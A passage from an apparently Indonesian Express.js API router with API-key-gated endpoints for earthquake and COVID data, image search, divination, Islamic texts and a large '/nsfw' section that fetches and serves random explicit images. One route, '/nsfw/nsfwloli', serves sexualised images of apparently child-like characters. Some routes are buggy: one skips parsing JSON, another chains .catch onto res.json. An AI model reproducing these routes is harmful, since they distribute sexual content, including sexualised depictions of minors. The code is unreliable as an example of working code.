            .then(response => response.json())
            .then(data => {
                var result = data;
                res.json({
                    result
                })
            })
            .catch(e => {
                console.log(e);
                res.json(loghandler.error)
            })
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/information/covid-world', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.kata
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        fetch(encodeURI(`https://covid19-api-zhirrr.vercel.app/api/world`))
            .then(response => response.json())
            .then(data => {
                var result = data;
                res.json({
                    result
                })
            })
            .catch(e => {
                console.log(e);
                res.json(loghandler.error)
            })
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/information/gempa', async (req, res, next) => {
    var apikey = req.query.apikey
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        const result = await scr.gempa()
        res.json({
            status: 'true',
            author: 'ordiston',
            result
        })
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/information/gempanow', async (req, res, next) => {
    var apikey = req.query.apikey
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        const result = await scr.gempaNow()
        res.json({
            status: 'true',
            author: 'ordiston',
            result
        })
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/information/tsunami', async (req, res, next) => {
    var apikey = req.query.apikey
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        const result = await scr.tsunami()
        res.json({
            status: 'true',
            author: 'ordiston',
            result
        })
    } else {
        res.json(loghandler.apikey)
    }
})

//―――――――――――――――――――――――――――――――――――――――――― ┏  Search  ┓ ―――――――――――――――――――――――――――――――――――――――――― \\
router.get('/search/google-image', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.query
    if (!apikey) return res.json(loghandler.noapikey)
    if (!text) return res.json({
        status: false,
        creator: `${creator}`,
        message: "[!] Masukan parameter query"
    })
    if (listkey.includes(apikey)) {
        scr.googleImage(text).then(data => {
                var data = data;
                res.json({
                    status: 200,
                    data,
                })
            })
            .catch(e => {
                console.log(e);
                res.json(loghandler.error)
            })
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/search/wallpaper', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.query
    if (!apikey) return res.json(loghandler.noapikey)
    if (!text) return res.json({
        status: false,
        creator: `${creator}`,
        message: "[!] Masukan parameter query"
    })
    if (listkey.includes(apikey)) {
        scr.wallpaper(text)
            .then(data => {
                var result = data;
                res.json({
                    result
                })
            })
            .catch(e => {
                console.log(e);
                res.json(loghandler.error)
            })
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/search/pinterest', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.query
    if (!apikey) return res.json(loghandler.noapikey)
    if (!text) return res.json({
        status: false,
        creator: `${creator}`,
        message: "[!] Masukan parameter query"
    })
    if (listkey.includes(apikey)) {
        scr.pinterest(text)
            .then(data => {
                var result = data;
                res.json({
                    result
                })
            })
            .catch(e => {
                console.log(e);
                res.json(loghandler.error)
            })
    } else {
        res.json(loghandler.apikey)
    }
})

//―――――――――――――――――――――――――――――――――――――――――― ┏  Nefw  ┓ ―――――――――――――――――――――――――――――――――――――――――― \\
router.get('/nsfw/ahegao', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.page
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        fetch(encodeURI(`https://raw.githubusercontent.com/zeroonecraft/data-gabut/main/nsfw/ahegao.json`))
            .then(response => response.json())
            .then(data => {
                var result = data;
                var result = data[Math.floor(Math.random() * data.length)];
                var requestSettings = {
                    url: result.url,
                    method: 'GET',
                    encoding: null
                };
                request(requestSettings, function(error, response, body) {
                    res.set('Content-Type', 'image/jpg');
                    res.send(body);
                });
            })
    } else {
        res.json(loghandler.apikey)
    }
})

router.get('/nsfw/ass', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.page
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        fetch(encodeURI(`https://raw.githubusercontent.com/zeroonecraft/data-gabut/main/nsfw/ass.json`))
            .then(response => response.json())
            .then(data => {
                var result = data;
                var result = data[Math.floor(Math.random() * data.length)];
                var requestSettings = {
                    url: result.url,
                    method: 'GET',
                    encoding: null
                };
                request(requestSettings, function(error, response, body) {
                    res.set('Content-Type', 'image/jpg');
                    res.send(body);
                });
            })
    } else {
        res.json(loghandler.apikey)
    }
})

router.get('/nsfw/bdsm', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.page
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        fetch(encodeURI(`https://raw.githubusercontent.com/zeroonecraft/data-gabut/main/nsfw/bdsm.json`))
            .then(response => response.json())
            .then(data => {
                var result = data;
                var result = data[Math.floor(Math.random() * data.length)];
                var requestSettings = {
                    url: result.url,
                    method: 'GET',
                    encoding: null
                };
                request(requestSettings, function(error, response, body) {
                    res.set('Content-Type', 'image/jpg');
                    res.send(body);
                });
            })
    } else {
        res.json(loghandler.apikey)
    }
})

router.get('/nsfw/blowjob', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.page
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        fetch(encodeURI(`https://raw.githubusercontent.com/zeroonecraft/data-gabut/main/nsfw/blowjob.json`))
            .then(response => response.json())
            .then(data => {
                var result = data;
                var result = data[Math.floor(Math.random() * data.length)];
                var requestSettings = {
                    url: result.url,
                    method: 'GET',
                    encoding: null
                };
                request(requestSettings, function(error, response, body) {
                    res.set('Content-Type', 'image/jpg');
                    res.send(body);
                });
            })
    } else {
        res.json(loghandler.apikey)
    }
})

router.get('/nsfw/cuckold', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.page
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        fetch(encodeURI(`https://raw.githubusercontent.com/zeroonecraft/data-gabut/main/nsfw/cuckold.json`))
            .then(response => response.json())
            .then(data => {
                var result = data;
                var result = data[Math.floor(Math.random() * data.length)];
                var requestSettings = {
                    url: result.url,
                    method: 'GET',
                    encoding: null
                };
                request(requestSettings, function(error, response, body) {
                    res.set('Content-Type', 'image/jpg');
                    res.send(body);
                });
            })
    } else {
        res.json(loghandler.apikey)
    }
})

router.get('/nsfw/cum', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.page
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        fetch(encodeURI(`https://raw.githubusercontent.com/zeroonecraft/data-gabut/main/nsfw/cum.json`))
            .then(response => response.json())
            .then(data => {
                var result = data;
                var result = data[Math.floor(Math.random() * data.length)];
                var requestSettings = {
                    url: result.url,
                    method: 'GET',
                    encoding: null
                };
                request(requestSettings, function(error, response, body) {
                    res.set('Content-Type', 'image/jpg');
                    res.send(body);
                });
            })
    } else {
        res.json(loghandler.apikey)
    }
})

router.get('/nsfw/eba', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.page
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        fetch(encodeURI(`https://raw.githubusercontent.com/zeroonecraft/data-gabut/main/nsfw/eba.json`))
            .then(response => response.json())
            .then(data => {
                var result = data;
                var result = data[Math.floor(Math.random() * data.length)];
                var requestSettings = {
                    url: result.url,
                    method: 'GET',
                    encoding: null
                };
                request(requestSettings, function(error, response, body) {
                    res.set('Content-Type', 'image/jpg');
                    res.send(body);
                });
            })
    } else {
        res.json(loghandler.apikey)
    }
})

router.get('/nsfw/ero', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.page
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        fetch(encodeURI(`https://raw.githubusercontent.com/zeroonecraft/data-gabut/main/nsfw/ero.json`))
            .then(response => response.json())
            .then(data => {
                var result = data;
                var result = data[Math.floor(Math.random() * data.length)];
                var requestSettings = {
                    url: result.url,
                    method: 'GET',
                    encoding: null
                };
                request(requestSettings, function(error, response, body) {
                    res.set('Content-Type', 'image/jpg');
                    res.send(body);
                });
            })
    } else {
        res.json(loghandler.apikey)
    }
})

router.get('/nsfw/femdom', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.page
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        fetch(encodeURI(`https://raw.githubusercontent.com/zeroonecraft/data-gabut/main/nsfw/femdom.json`))
            .then(response => response.json())
            .then(data => {
                var result = data;
                var result = data[Math.floor(Math.random() * data.length)];
                var requestSettings = {
                    url: result.url,
                    method: 'GET',
                    encoding: null
                };
                request(requestSettings, function(error, response, body) {
                    res.set('Content-Type', 'image/jpg');
                    res.send(body);
                });
            })
    } else {
        res.json(loghandler.apikey)
    }
})

router.get('/nsfw/foot', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.page
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        fetch(encodeURI(`https://raw.githubusercontent.com/zeroonecraft/data-gabut/main/nsfw/foot.json`))
            .then(response => response.json())
            .then(data => {
                var result = data;
                var result = data[Math.floor(Math.random() * data.length)];
                var requestSettings = {
                    url: result.url,
                    method: 'GET',
                    encoding: null
                };
                request(requestSettings, function(error, response, body) {
                    res.set('Content-Type', 'image/jpg');
                    res.send(body);
                });
            })
    } else {
        res.json(loghandler.apikey)
    }
})

router.get('/nsfw/gangbang', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.page
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        fetch(encodeURI(`https://raw.githubusercontent.com/zeroonecraft/data-gabut/main/nsfw/gangbang.json`))
            .then(response => response.json())
            .then(data => {
                var result = data;
                var result = data[Math.floor(Math.random() * data.length)];
                var requestSettings = {
                    url: result.url,
                    method: 'GET',
                    encoding: null
                };
                request(requestSettings, function(error, response, body) {
                    res.set('Content-Type', 'image/jpg');
                    res.send(body);
                });
            })
    } else {
        res.json(loghandler.apikey)
    }
})

router.get('/nsfw/gifs', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.page
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        fetch(encodeURI(`https://raw.githubusercontent.com/zeroonecraft/data-gabut/main/nsfw/gifs.json`))
            .then(response => response.json())
            .then(data => {
                var result = data;
                var result = data[Math.floor(Math.random() * data.length)];
                var requestSettings = {
                    url: result.url,
                    method: 'GET',
                    encoding: null
                };
                request(requestSettings, function(error, response, body) {
                    res.set('Content-Type', 'image/jpg');
                    res.send(body);
                });
            })
    } else {
        res.json(loghandler.apikey)
    }
})

router.get('/nsfw/glasses', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.page
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        fetch(encodeURI(`https://raw.githubusercontent.com/zeroonecraft/data-gabut/main/nsfw/glasses.json`))
            .then(response => response.json())
            .then(data => {
                var result = data;
                var result = data[Math.floor(Math.random() * data.length)];
                var requestSettings = {
                    url: result.url,
                    method: 'GET',
                    encoding: null
                };
                request(requestSettings, function(error, response, body) {
                    res.set('Content-Type', 'image/jpg');
                    res.send(body);
                });
            })
    } else {
        res.json(loghandler.apikey)
    }
})

router.get('/nsfw/hentai', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.page
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        fetch(encodeURI(`https://raw.githubusercontent.com/zeroonecraft/data-gabut/main/nsfw/hentai.json`))
            .then(response => response.json())
            .then(data => {
                var result = data;
                var result = data[Math.floor(Math.random() * data.length)];
                var requestSettings = {
                    url: result.url,
                    method: 'GET',
                    encoding: null
                };
                request(requestSettings, function(error, response, body) {
                    res.set('Content-Type', 'image/jpg');
                    res.send(body);
                });
            })
    } else {
        res.json(loghandler.apikey)
    }
})

router.get('/nsfw/hentaivid', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.page
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        fetch(encodeURI(`https://raw.githubusercontent.com/zeroonecraft/data-gabut/main/nsfw/hentaivid.json`))
            .then(response => response.json())
            .then(data => {
                var result = data;
                var result = data[Math.floor(Math.random() * data.length)];
                var requestSettings = {
                    url: result.url,
                    method: 'GET',
                    encoding: null
                };
                request(requestSettings, function(error, response, body) {
                    res.set('Content-Type', 'video/mp4');
                    res.send(body);
                });
            })
    } else {
        res.json(loghandler.apikey)
    }
})

router.get('/nsfw/jahy', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.page
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        fetch(encodeURI(`https://raw.githubusercontent.com/zeroonecraft/data-gabut/main/nsfw/jahy.json`))
            .then(response => response.json())
            .then(data => {
                var result = data;
                var result = data[Math.floor(Math.random() * data.length)];
                var requestSettings = {
                    url: result.url,
                    method: 'GET',
                    encoding: null
                };
                request(requestSettings, function(error, response, body) {
                    res.set('Content-Type', 'image/jpg');
                    res.send(body);
                });
            })
    } else {
        res.json(loghandler.apikey)
    }
})

router.get('/nsfw/manga', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.page
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        fetch(encodeURI(`https://raw.githubusercontent.com/zeroonecraft/data-gabut/main/nsfw/manga.json`))
            .then(response => response.json())
            .then(data => {
                var result = data;
                var result = data[Math.floor(Math.random() * data.length)];
                var requestSettings = {
                    url: result.url,
                    method: 'GET',
                    encoding: null
                };
                request(requestSettings, function(error, response, body) {
                    res.set('Content-Type', 'image/jpg');
                    res.send(body);
                });
            })
    } else {
        res.json(loghandler.apikey)
    }
})

router.get('/nsfw/masturbation', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.page
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        fetch(encodeURI(`https://raw.githubusercontent.com/zeroonecraft/data-gabut/main/nsfw/masturbation.json`))
            .then(response => response.json())
            .then(data => {
                var result = data;
                var result = data[Math.floor(Math.random() * data.length)];
                var requestSettings = {
                    url: result.url,
                    method: 'GET',
                    encoding: null
                };
                request(requestSettings, function(error, response, body) {
                    res.set('Content-Type', 'image/jpg');
                    res.send(body);
                });
            })
    } else {
        res.json(loghandler.apikey)
    }
})

router.get('/nsfw/neko', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.page
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        fetch(encodeURI(`https://raw.githubusercontent.com/zeroonecraft/data-gabut/main/nsfw/neko.json`))
            .then(response => response.json())
            .then(data => {
                var result = data;
                var result = data[Math.floor(Math.random() * data.length)];
                var requestSettings = {
                    url: result.url,
                    method: 'GET',
                    encoding: null
                };
                request(requestSettings, function(error, response, body) {
                    res.set('Content-Type', 'image/jpg');
                    res.send(body);
                });
            })
    } else {
        res.json(loghandler.apikey)
    }
})

router.get('/nsfw/neko2', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.page
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        fetch(encodeURI(`https://raw.githubusercontent.com/zeroonecraft/data-gabut/main/nsfw/neko2.json`))
            .then(response => response.json())
            .then(data => {
                var result = data;
                var result = data[Math.floor(Math.random() * data.length)];
                var requestSettings = {
                    url: result.url,
                    method: 'GET',
                    encoding: null
                };
                request(requestSettings, function(error, response, body) {
                    res.set('Content-Type', 'image/jpg');
                    res.send(body);
                });
            })
    } else {
        res.json(loghandler.apikey)
    }
})

router.get('/nsfw/nsfwloli', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.page
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        fetch(encodeURI(`https://raw.githubusercontent.com/zeroonecraft/data-gabut/main/nsfw/nsfwloli.json`))
            .then(response => response.json())
            .then(data => {
                var result = data;
                var result = data[Math.floor(Math.random() * data.length)];
                var requestSettings = {
                    url: result.url,
                    method: 'GET',
                    encoding: null
                };
                request(requestSettings, function(error, response, body) {
                    res.set('Content-Type', 'image/jpg');
                    res.send(body);
                });
            })
    } else {
        res.json(loghandler.apikey)
    }
})

router.get('/nsfw/orgy', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.page
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        fetch(encodeURI(`https://raw.githubusercontent.com/zeroonecraft/data-gabut/main/nsfw/orgy.json`))
            .then(response => response.json())
            .then(data => {
                var result = data;
                var result = data[Math.floor(Math.random() * data.length)];
                var requestSettings = {
                    url: result.url,
                    method: 'GET',
                    encoding: null
                };
                request(requestSettings, function(error, response, body) {
                    res.set('Content-Type', 'image/jpg');
                    res.send(body);
                });
            })
    } else {
        res.json(loghandler.apikey)
    }
})

router.get('/nsfw/panties', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.page
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        fetch(encodeURI(`https://raw.githubusercontent.com/zeroonecraft/data-gabut/main/nsfw/panties.json`))
            .then(response => response.json())
            .then(data => {
                var result = data;
                var result = data[Math.floor(Math.random() * data.length)];
                var requestSettings = {
                    url: result.url,
                    method: 'GET',
                    encoding: null
                };
                request(requestSettings, function(error, response, body) {
                    res.set('Content-Type', 'image/jpg');
                    res.send(body);
                });
            })
    } else {
        res.json(loghandler.apikey)
    }
})

router.get('/nsfw/pussy', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.page
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        fetch(encodeURI(`https://raw.githubusercontent.com/zeroonecraft/data-gabut/main/nsfw/pussy.json`))
            .then(response => response.json())
            .then(data => {
                var result = data;
                var result = data[Math.floor(Math.random() * data.length)];
                var requestSettings = {
                    url: result.url,
                    method: 'GET',
                    encoding: null
                };
                request(requestSettings, function(error, response, body) {
                    res.set('Content-Type', 'image/jpg');
                    res.send(body);
                });
            })
    } else {
        res.json(loghandler.apikey)
    }
})

router.get('/nsfw/tentacles', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.page
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        fetch(encodeURI(`https://raw.githubusercontent.com/zeroonecraft/data-gabut/main/nsfw/tentacles.json`))
            .then(response => response.json())
            .then(data => {
                var result = data;
                var result = data[Math.floor(Math.random() * data.length)];
                var requestSettings = {
                    url: result.url,
                    method: 'GET',
                    encoding: null
                };
                request(requestSettings, function(error, response, body) {
                    res.set('Content-Type', 'image/jpg');
                    res.send(body);
                });
            })
    } else {
        res.json(loghandler.apikey)
    }
})

router.get('/nsfw/thighs', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.page
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        fetch(encodeURI(`https://raw.githubusercontent.com/zeroonecraft/data-gabut/main/nsfw/thighs.json`))
            .then(response => response.json())
            .then(data => {
                var result = data;
                var result = data[Math.floor(Math.random() * data.length)];
                var requestSettings = {
                    url: result.url,
                    method: 'GET',
                    encoding: null
                };
                request(requestSettings, function(error, response, body) {
                    res.set('Content-Type', 'image/jpg');
                    res.send(body);
                });
            })
    } else {
        res.json(loghandler.apikey)
    }
})

router.get('/nsfw/yuri', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.page
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        fetch(encodeURI(`https://raw.githubusercontent.com/zeroonecraft/data-gabut/main/nsfw/yuri.json`))
            .then(response => response.json())
            .then(data => {
                var result = data;
                var result = data[Math.floor(Math.random() * data.length)];
                var requestSettings = {
                    url: result.url,
                    method: 'GET',
                    encoding: null
                };
                request(requestSettings, function(error, response, body) {
                    res.set('Content-Type', 'image/jpg');
                    res.send(body);
                });
            })
    } else {
        res.json(loghandler.apikey)
    }
})

router.get('/nsfw/zettai', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.page
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        fetch(encodeURI(`https://raw.githubusercontent.com/zeroonecraft/data-gabut/main/nsfw/zettai.json`))
            .then(data => {
                var result = data;
                var result = data[Math.floor(Math.random() * data.length)];
                var requestSettings = {
                    url: result.url,
                    method: 'GET',
                    encoding: null
                };
                request(requestSettings, function(error, response, body) {
                    res.set('Content-Type', 'image/jpg');
                    res.send(body);
                });
            })
    } else {
        res.json(loghandler.apikey)
    }
})

router.get('/nsfw/ryouiki', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.page
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        const ryo = JSON.parse(fs.readFileSync(__path + '/database/ryouiki.json'));
        const randry = ryo[Math.floor(Math.random() * ryo.length)];
        data = await fetch(randry).then(v => v.buffer())
        await fs.writeFileSync(__path + '/tmp/ryo.jpeg', data)
        res.sendFile(__path + '/tmp/ryo.jpeg')
    } else {
        res.json(loghandler.apikey)
    }
})

router.get('/nsfw/paizuri', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.page
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        const paizuri = JSON.parse(fs.readFileSync(__path + '/database/paizuri.json'));
        const ranpaizuri = paizuri[Math.floor(Math.random() * paizuri.length)];
        data = await fetch(ranpaizuri).then(v => v.buffer())
        await fs.writeFileSync(__path + '/tmp/paizuri.jpeg', data)
        res.sendFile(__path + '/tmp/paizuri.jpeg')
    } else {
        res.json(loghandler.apikey)
    }
})

router.get('/nsfw/kobo', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.page
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        const kobo = JSON.parse(fs.readFileSync(__path + '/database/kobo.json'));
        const randkob = kobo[Math.floor(Math.random() * kobo.length)];
        data = await fetch(randkob).then(v => v.buffer())
        await fs.writeFileSync(__path + '/tmp/kobo.jpeg', data)
        res.sendFile(__path + '/tmp/kobo.jpeg')
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/nsfw/zeta', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.page
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        const zeta = JSON.parse(fs.readFileSync(__path + '/database/zeta.json'));
        const ranzeta = zeta[Math.floor(Math.random() * zeta.length)];
        data = await fetch(ranzeta).then(v => v.buffer())
        await fs.writeFileSync(__path + '/tmp/zeta.jpeg', data)
        res.sendFile(__path + '/tmp/zeta.jpeg')
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/nsfw/ollie', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.page
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        const ollie = JSON.parse(fs.readFileSync(__path + '/database/ollie.json'));
        const ranollie = ollie[Math.floor(Math.random() * ollie.length)];
        data = await fetch(ranollie).then(v => v.buffer())
        await fs.writeFileSync(__path + '/tmp/ollie.jpeg', data)
        res.sendFile(__path + '/tmp/ollie.jpeg')
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/nsfw/kaela', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.page
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        const kaela = JSON.parse(fs.readFileSync(__path + '/database/kaela.json'));
        const rankaela = kaela[Math.floor(Math.random() * kaela.length)];
        data = await fetch(rankaela).then(v => v.buffer())
        await fs.writeFileSync(__path + '/tmp/kaela.jpeg', data)
        res.sendFile(__path + '/tmp/kaela.jpeg')
    } else {
        res.json(loghandler.apikey)
    }
})

//―――――――――――――――――――――――――――――――――――――――――― ┏  Primbon  ┓ ―――――――――――――――――――――――――――――――――――――――――― \\
router.get('/primbon/artimimpi', async (req, res, next) => {
    var apikey = req.query.apikey
    var mimpi = req.query.mimpi
    if (!apikey) return res.json(loghandler.noapikey)
    if (!mimpi) return res.json({
        status: false,
        creator: `${creator}`,
        message: "[!] Masukan parameter mimpi"
    })
    if (listkey.includes(apikey)) {
        const result = await scr.artimimpi(mimpi)
        res.json({
                status: 'true',
                author: 'ordiston',
                result
            })
            .catch(e => {
                console.log(e);
                res.json(loghandler.error)
            })
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/primbon/nomorhphoki', async (req, res, next) => {
    var apikey = req.query.apikey
    var number = req.query.number
    if (!apikey) return res.json(loghandler.noapikey)
    if (!number) return res.json({
        status: false,
        creator: `${creator}`,
        message: "[!] Masukan parameter nomer hp"
    })
    if (listkey.includes(apikey)) {
        const result = await scr.nomorhoki(number)
        res.json({
            status: 'true',
            author: 'ordiston',
            result
        })
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/primbon/zodiac', async (req, res, next) => {
    var apikey = req.query.apikey
    var dates = req.query.dates
    var months = req.query.months
    if (!apikey) return res.json(loghandler.noapikey)
    if (!dates) return res.json({
        status: false,
        creator: `${creator}`,
        message: "[!] Masukan parameter tanggal"
    })
    if (!months) return res.json({
        status: false,
        creator: `${creator}`,
        message: "[!] Masukan parameter bulan"
    })
    if (listkey.includes(apikey)) {
        const result = await scr.getZodiac(months, dates)
        res.json(
            result
        )
    } else {
        res.json(loghandler.apikey)
    }
})

//―――――――――――――――――――――――――――――――――――――――――― ┏  Islamic  ┓ ―――――――――――――――――――――――――――――――――――――――――― \\
router.get('/islam/tahlil', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.page
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        fetch(encodeURI(`https://raw.githubusercontent.com/zeeoneofficial/My-SQL-Results/master/data/dataTahlil.json`))
            .then(response => response.json())
            .then(data => {
                var result = data;
                res.json({
                    result
                })
            })
            .catch(e => {
                console.log(e);
                res.json(loghandler.error)
            })
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/islam/wirid', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.page
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        fetch(encodeURI(`https://raw.githubusercontent.com/zeeoneofficial/My-SQL-Results/master/data/dataWirid.json`))
            .then(response => response.json())
            .then(data => {
                var result = data;
                res.json({
                    result
                })
            })
            .catch(e => {
                console.log(e);
                res.json(loghandler.error)
            })
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/islam/ayatkursi', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.page
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        fetch(encodeURI(`https://raw.githubusercontent.com/zeeoneofficial/My-SQL-Results/master/data/dataAyatKursi.json`))
            .then(response => response.json())
            .then(data => {
                var result = data;
                res.json({
                    result
                })
            })
            .catch(e => {
                console.log(e);
                res.json(loghandler.error)
            })
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/islam/doaharian', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.page
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        fetch(encodeURI(`https://raw.githubusercontent.com/zeeoneofficial/My-SQL-Results/master/data/dataDoaHarian.json`))
            .then(response => response.json())
            .then(data => {
                var result = data;
                res.json({
                    result
                })
            })
            .catch(e => {
                console.log(e);
                res.json(loghandler.error)
            })
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/islam/bacaanshalat', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.page
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        fetch(encodeURI(`https://raw.githubusercontent.com/zeeoneofficial/My-SQL-Results/master/data/dataBacaanShalat.json`))
            .then(response => response.json())
            .then(data => {
                var result = data;
                res.json({
                    result
                })
            })
            .catch(e => {
                console.log(e);
                res.json(loghandler.error)
            })
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/islam/niatshalat', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.page
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        fetch(encodeURI(`https://raw.githubusercontent.com/zeeoneofficial/My-SQL-Results/master/data/dataNiatShalat.json`))
            .then(response => response.json())
            .then(data => {
                var result = data;
                res.json({
                    result
                })
            })
            .catch(e => {
                console.log(e);
                res.json(loghandler.error)
            })
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/islam/kisahnabi', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.page
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        fetch(encodeURI(`https://raw.githubusercontent.com/zeeoneofficial/My-SQL-Results/master/data/dataKisahNabi.json`))
            .then(response => response.json())
            .then(data => {
                var result = data;
                res.json({
                    result
                })
            })
            .catch(e => {
                console.log(e);
                res.json(loghandler.error)
            })
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/islam/asmaulhusna', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.page
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        fetch(encodeURI(`https://raw.githubusercontent.com/zeeoneofficial/My-SQL-Results/master/data/dataAsmaulHusna.json`))
            .then(response => response.json())
            .then(data => {
                var result = data;
                res.json({
                    result
                })
            })
            .catch(e => {
                console.log(e);
                res.json(loghandler.error)
            })
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/islam/niatsubuh', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.page
